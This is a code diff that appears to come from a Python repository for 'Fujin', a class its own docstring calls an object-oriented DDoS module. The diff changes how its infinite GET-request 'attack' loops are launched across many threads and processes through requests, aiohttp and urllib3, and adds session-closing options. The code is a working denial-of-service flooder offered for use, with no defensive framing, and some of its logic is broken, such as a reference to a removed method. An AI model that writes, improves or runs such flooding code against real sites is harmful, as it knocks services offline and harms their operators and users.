@@ -17,7 +17,9 @@ class Fujin:
                  data: dict | None = None,
                  cookies: dict | None = None,
                  redirects: bool | None = None,
-                 timeout: int | None = None) -> None:
+                 timeout: int | None = None,
+                 closing_message: bool | None = False,
+                 caching: bool | None = False) -> None:
         """
         A Object-Orientated DDoS Module
 
@@ -47,6 +49,8 @@ class Fujin:
         self.connected = 0
         self.result = None
         self.status_code = None
+        self.closing_message = closing_message
+        self.caching = caching
 
         # Sessions and object to
         self.session = requests.session()
@@ -64,6 +68,7 @@ class Fujin:
 
 
 
+
     #
     # Error Handling
     #
@@ -71,48 +76,70 @@ class Fujin:
         """
         Closes all Sessions and Pooling Managers
         """
-        try:
-            print("\n\n\n")
-            # Close Requests Session
-            self.session.close()
-            print("\ Requests Session Closed")
 
-            # Close AIOHTTP Session
-            asyncio.run(self.aiohttp_session.close())
-            print("\ AIOHTTP Session Closed")
+        if self.closing_message:
+            try:
+                print("\n\n\n")
+                # Close Requests Session
+                self.session.close()
+                print("Requests Session Closed")
 
-            # URLLIB3 PoolManager
-            self.urllib_session.clear()
-            print("\ URLLIB Session Closed\n\n\n")
+                # Close AIOHTTP Session
+                asyncio.run(self.aiohttp_session.close())
+                print("AIOHTTP Session Closed")
 
-            # Dip out
-            sys.exit(0)
-        except Exception as e:
-            print(f"\n\n{e}\n\n")
-            sys.exit(0)
+                # URLLIB3 PoolManager
+                self.urllib_session.clear()
+                print("URLLIB Session Closed\n\n\n")
+
+                # Dip out
+                sys.exit(0)
+            except Exception as e:
+                print(f"\n\n{e}\n\n")
+                sys.exit(0)
+        else:
+            try:
+                self.session.close()
+                asyncio.run(self.aiohttp_session.close())
+                self.urllib_session.clear()
+            except Exception as e:
+                print(f"\n\n{e}\n\n")
+                sys.exit(0)
 
     async def close_sessions_a(self) -> None:
         """
         Closes all Sessions and Pooling Managers
         """
-        try:
-            # Close Requests Session
-            self.session.close()
-            print("\ Requests Session Closed")
+        
+        if self.closing_message:
+            try:
+                print("\n\n\n")
+                # Close Requests Session
+                self.session.close()
+                print("Requests Session Closed")
 
-            # Close AIOHTTP Session
-            await self.aiohttp_session.close()
-            print("\ AIOHTTP Session Closed")
+                # Close AIOHTTP Session
+                asyncio.run(self.aiohttp_session.close())
+                print("AIOHTTP Session Closed")
 
-            # URLLIB3 PoolManager
-            self.urllib_session.clear()
-            print("\ URLLIB Session Closed\n\n\n")
+                # URLLIB3 PoolManager
+                self.urllib_session.clear()
+                print("URLLIB Session Closed\n\n\n")
 
-            # Dip out
-            sys.exit(0)
-        except Exception as e:
-            print(f"\n\n{e}\n\n")
-            sys.exit(0)
+                # Dip out
+                sys.exit(0)
+            except Exception as e:
+                print(f"\n\n{e}\n\n")
+                sys.exit(0)
+        else:
+            try:
+                self.session.close()
+                asyncio.run(self.aiohttp_session.close())
+                self.urllib_session.clear()
+            except Exception as e:
+                print(f"\n\n{e}\n\n")
+                sys.exit(0)
+
     
 
 
@@ -176,32 +203,18 @@ class Fujin:
         Sends a GET Request with the AIOHTTP ClientSession Class
         """
 
-        r = self.aiohttp_session.get(url=self.url, allow_redirects=self.redirects, ssl=False)
+        r = self.aiohttp_session.get(self.url, headers=self.header, ssl=False)
+        self.connected += 1
+        self.result = self.connected
+        print(f"{self.result}")
 
-        # Log
-        self.sent += 1
-        self.status_code = r.cr_code
-
-        print(r)
-
-    def aio_sync_get(self) -> None:
-        """
-        Synchronous Version
-
-        Sends a GET Request with the AIOHTTP ClientSession Class
-        """
-
-        with self.aiohttp_session.get(url=self.url, allow_redirects=self.redirects, ssl=False) as r:
-            print(r)
-        self.sent+=1
-        self.status_code=r.cr_code
 
     async def urllib_async_get(self) -> None:
 
         r = self.urllib_session.request(url=self.url, headers=self.header, method='GET')
         self.connected += 1
         self.status_code = r.status
-        self.result = self.status_code, self.connected
+        self.result = self.connected, self.status_code
         print(f"{self.result}")
 
     async def urllib_sync_get(self) -> None:
@@ -209,7 +222,7 @@ class Fujin:
         r = self.urllib_session.request(url=self.url, headers=self.header, method='GET')
         self.connected += 1
         self.status_code = r.status
-        self.result = self.status_code, self.connected
+        self.result = self.connected, self.status_code
         print(f"{self.result}")
     
 
@@ -218,6 +231,9 @@ class Fujin:
     #
     # Infinite loops for Async and Sync functions
     #
+
+
+    ### Requests Session ###
     def begin_async_get_attack(self) -> None:   
         """
         while 1:
@@ -230,10 +246,14 @@ class Fujin:
         (This function is synchronous to allow for asynchronous)
 
         I would advise using the threading or multiprocessing function
-        """
+        """ 
 
-        while 1:
-            asyncio.run(self.async_get())
+        try:
+            while 1:
+                asyncio.run(self.async_get())
+        except KeyboardInterrupt:
+            self.close_sessions()
+
 
     def begin_sync_get_attack(self) -> None:
         """
@@ -242,9 +262,15 @@ class Fujin:
 
         An infinite loop running the synchronous get function with python requests session
         """
-        while 1:
-            self.sync_get()
 
+        try:
+            while 1:
+                self.sync_get()
+        except KeyboardInterrupt:
+            self.close_sessions()
+
+
+    ### AIO ###
     def begin_aio_async_attack(self) -> None:
         """
         while 1:
@@ -258,20 +284,15 @@ class Fujin:
 
         I would advise using the threading or multiprocessing function
         """
-        while 1:
-            asyncio.run(self.aio_async_get())
 
-    def begin_aio_sync_attack(self) -> None:
-        """
-        while 1:
-            self.sync_get()
+        try:
+            while 1:
+                asyncio.run(self.aio_async_get())
+        except KeyboardInterrupt:
+            self.close_sessions()
 
-        An infinite loop running the synchronous get function with python requests session
-        """
 
-        while 1:
-            self.aio_sync_get()
-
+    ### URLLIB ### 
     def begin_urllib_async_attack(self) -> None:
         """
         while 1:
@@ -286,8 +307,11 @@ class Fujin:
         I would advise using the threading or multiprocessing function
         """
 
-        while 1:
-            asyncio.run(self.urllib_async_get())
+        try:
+            while 1:
+                asyncio.run(self.urllib_async_get())
+        except KeyboardInterrupt:
+            self.close_sessions()
 
     def begin_urllib_sync_attack(self) -> None:
         """
@@ -297,8 +321,11 @@ class Fujin:
         An infinite loop running the synchronous get function with the urllib pooling manager
         """
 
-        while 1:
-            self.urllib_sync_get()
+        try:
+            while 1:
+                self.urllib_sync_get()
+        except KeyboardInterrupt:
+            self.close_sessions()
 
 
     
@@ -310,7 +337,8 @@ class Fujin:
     def thread_async_attack(self, 
                             threads: int | None=None, 
                             daemon: bool | None=None,
-                            pooling_manager: str | None = None) -> None:
+                            pooling_manager: str | None = None,
+                            thread_name: str | None = None) -> None:
         """
         Uses the threading module to speed up the attack, with as many threads as you like
 
@@ -321,35 +349,40 @@ class Fujin:
         3. Urllib3
         """
 
+        # If parameter is left blank/empty just turn on Daemon on they're going to get spammed with messages
         if daemon == None: daemon = True
 
+        # If the user leaves the name parameter blank then default it
+        if thread_name == None: thread_name = "FUJIN"
+
+        # Request Session
         if pooling_manager in self.requests:
             for x in range(threads):
-                t = threading.Thread(target=self.begin_async_get_attack, daemon=daemon)
+                t = threading.Thread(target=self.begin_async_get_attack, name=thread_name, daemon=daemon)
+                t.start()
                 self.async_threads.append(t)
-            for x in range(threads):
-                self.async_threads[x].start()
             for x in range(threads):
                 self.async_threads[x].join()
 
+        # AIOHTTP Session
         elif pooling_manager in self.aio:
             for x in range(threads):
-                t = threading.Thread(target=self.begin_aio_async_attack, daemon=daemon)
+                t = threading.Thread(target=self.begin_aio_async_attack, name=thread_name, daemon=daemon)
+                t.start()
                 self.async_threads.append(t)
-            for x in range(threads):
-                self.async_threads[x].start()
             for x in range(threads):
                 self.async_threads[x].join()
 
+        # URLLIB Pooling Manager
         elif pooling_manager in self.urllib:
             for x in range(threads):
-                t = threading.Thread(target=self.begin_urllib_async_attack, daemon=daemon)
+                t = threading.Thread(target=self.begin_urllib_async_attack, name=thread_name, daemon=daemon)
+                t.start()
                 self.async_threads.append(t)
-            for x in range(threads):
-                self.async_threads[x].start()
             for x in range(threads):
                 self.async_threads[x].join()
 
+        # Friendly Message
         else:
             print("Choose a window manager ya retard")
             self.close_sessions()
@@ -358,43 +391,43 @@ class Fujin:
     def thread_sync_attack(self, 
                            threads: int | None = None, 
                            daemon: bool | None = None,
-                           pooling_manager: str | None = None) -> None:
+                           pooling_manager: str | None = None,
+                           thread_name: str | None = None) -> None:
         """
         Uses the threading module to speed up the attack, with as many threads as you like
 
         Pooling Manager Options (write as a string):
 
         1. Requests
-        2. Aiohttp
-        3. Pooling Manager
+        2. Pooling Manager
         """
 
+        # If parameter is left empty then turn on daemon
         if daemon == None: daemon = True
 
+        # If the user leaves the name parameter blank then default it
+        if thread_name == None: thread_name = "FUJIN"
+
+        # Requests Session
         if pooling_manager in self.requests:
             for x in range(threads):
-                t = threading.Thread(target=self.begin_sync_get_attack, daemon=daemon)
+                t = threading.Thread(target=self.begin_sync_get_attack, name=thread_name, daemon=daemon)
+                t.start()
                 self.async_threads.append(t)
-            for x in range(threads):
-                self.async_threads[x].start()
             for x in range(threads):
                 self.async_threads[x].join()
 
+        # Let user know that AIOHTTP is Asynchronous
         elif pooling_manager in self.aio:
-            for x in range(threads):
-                t = threading.Thread(target=self.begin_aio_sync_attack, daemon=daemon)
-                self.async_threads.append(t)
-            for x in range(threads):
-                self.async_threads[x].start()
-            for x in range(threads):
-                self.async_threads[x].join()
+            print("Error: AIOHTTP does not work with Synchronous Functions.")
+            self.close_sessions()
 
+        # URLLIB Pooling Manager
         elif pooling_manager in self.urllib:
             for x in range(threads):
-                t = threading.Thread(target=self.begin_aio_sync_attack, daemon=daemon)
+                t = threading.Thread(target=self.begin_aio_sync_attack, name=thread_name, daemon=daemon)
+                t.start()
                 self.async_threads.append(t)
-            for x in range(threads):
-                self.async_threads[x].start()
             for x in range(threads):
                 self.async_threads[x].join()
 
@@ -411,49 +444,48 @@ class Fujin:
     def multiproc_sync_attack(self, 
                               number_of_processes: int | None = None, 
                               daemon: bool | None = None,
-                              pooling_manager: str | None = None) -> None:
+                              pooling_manager: str | None = None,
+                              thread_name: str | None = None) -> None:
         """
         Uses the multiprocessing function to speed up the attack.
 
         Pooling Manager Options (write as a string):
 
         1. Requests
-        2. Aiohttp
-        3. Pooling Manager
+        2. Pooling Manager
         """
 
         # Rename the variable so I can easily write :)))
         numproc = number_of_processes
 
+        # If the user leaves the daemon parameter empty then just default it to on
         if daemon == None: daemon = True
 
+        # If the user leaves the name parameter blank then default it
+        if thread_name == None: thread_name = "FUJIN"
+
+        # Requests Session
         if pooling_manager in self.requests:
             for x in range(numproc):
-                p = multiprocessing.Process(target=self.begin_sync_get_attack, daemon=daemon)
+                p = multiprocessing.Process(target=self.begin_sync_get_attack, name=thread_name, daemon=daemon)
+                p.start()
                 self.async_processes.append(p)
-            for x in range(numproc):
-                self.async_processes[x].start()
             for x in range(numproc):
                 self.async_processes[x].join()
 
         elif pooling_manager in self.aio:
+            print("Error: AIOHTTP does not work with Synchronous Functions.")
+            self.close_sessions()
+
+        elif pooling_manager in self.urllib:
             for x in range(numproc):
-                p = multiprocessing.Process(target=self.begin_aio_sync_attack, daemon=daemon)
+                p = multiprocessing.Process(target=self.begin_urllib_sync_attack, name=thread_name, daemon=daemon)
+                p.start()
                 self.async_processes.append(p)
-            for x in range(numproc):
-                self.async_processes[x].start()
-            for x in range(numproc):
-                self.async_processes[x].join()
-            
-        elif pooling_manager in self.aio:
-            for x in range(numproc):
-                p = multiprocessing.Process(target=self.begin_urllib_sync_attack, daemon=daemon)
-                self.async_processes.append(p)
-            for x in range(numproc):
-                self.async_processes[x].start()
             for x in range(numproc):
                 self.async_processes[x].join()
 
+        # Friendly message to people who would not like to use it
         else:
             print("Choose a pooling manager ya sausage !!!")
             self.close_sessions()
@@ -462,7 +494,8 @@ class Fujin:
     def multiproc_async_attack(self, 
                                number_of_processes: int | None = None, 
                                daemon: bool | None = None,
-                               pooling_manager: str | None = None) -> None:
+                               pooling_manager: str | None = None,
+                               thread_name: str | None = None) -> None:
         """
         Uses the multiprocessing function to speed up the attack.
 
@@ -478,35 +511,40 @@ class Fujin:
         # Rewrite the var so i can easy write :)))
         numproc = number_of_processes
 
+        # If the user leaves the daemon parameter empty then just default it to on
         if daemon == None: daemon = True
 
+        # If the user leaves the name parameter blank then default it
+        if thread_name == None: thread_name = "FUJIN"
+
+        # Requests Session
         if pooling_manager in self.requests:
             for x in range(numproc):
-                p = multiprocessing.Process(target=self.begin_async_get_attack, daemon=daemon)
+                p = multiprocessing.Process(target=self.begin_async_get_attack, name=thread_name, daemon=daemon)
+                p.start()
                 self.async_processes.append(p)
-            for x in range(numproc):
-                self.async_processes[x].start()
             for x in range(numproc):
                 self.async_processes[x].join()
 
+        # AIOHTTP
         elif pooling_manager in self.aio:
             for x in range(numproc):
-                p = multiprocessing.Process(target=self.begin_aio_async_attack, daemon=daemon)
+                p = multiprocessing.Process(target=self.begin_aio_async_attack, name=thread_name, daemon=daemon)
+                p.start()
                 self.async_processes.append(p)
-            for x in range(numproc):
-                self.async_processes[x].start()
             for x in range(numproc):
                 self.async_processes[x].join()
 
-        elif pooling_manager in self.aio:
+        # URLLIB Pooling Manager
+        elif pooling_manager in self.urllib:
             for x in range(numproc):
-                p = multiprocessing.Process(target=self.begin_urllib_async_attack, daemon=daemon)
+                p = multiprocessing.Process(target=self.begin_urllib_async_attack, name=thread_name, daemon=daemon)
+                p.start()
                 self.async_processes.append(p)
-            for x in range(numproc):
-                self.async_processes[x].start()
             for x in range(numproc):
                 self.async_processes[x].join()
 
+        # Friendly Message :)))
         else:
             print("Choose a pooling manager ya sausage !!!")
             self.close_sessions()
